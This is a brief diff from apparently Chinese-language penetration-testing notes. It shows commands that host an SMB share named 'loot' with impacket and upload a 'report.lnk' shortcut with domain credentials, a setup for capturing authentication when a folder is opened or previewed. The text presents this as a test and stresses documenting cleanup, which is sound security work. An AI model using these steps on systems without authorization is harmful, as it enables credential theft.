@@ -36,4 +36,4 @@ impacket-smbserver share ./loot -smb2support
 smbclient //192.168.1.10/share -U 'domain/user%pass' -c 'put report.lnk'
 ```
 
-小记录：这个工具适合验证“打开目录或预览文件是否会泄露认证”。测试文件命名、投放位置和清理动作要写清楚。
+这个工具适合验证“打开目录或预览文件是否会泄露认证”。测试文件命名、投放位置和清理动作要写清楚。
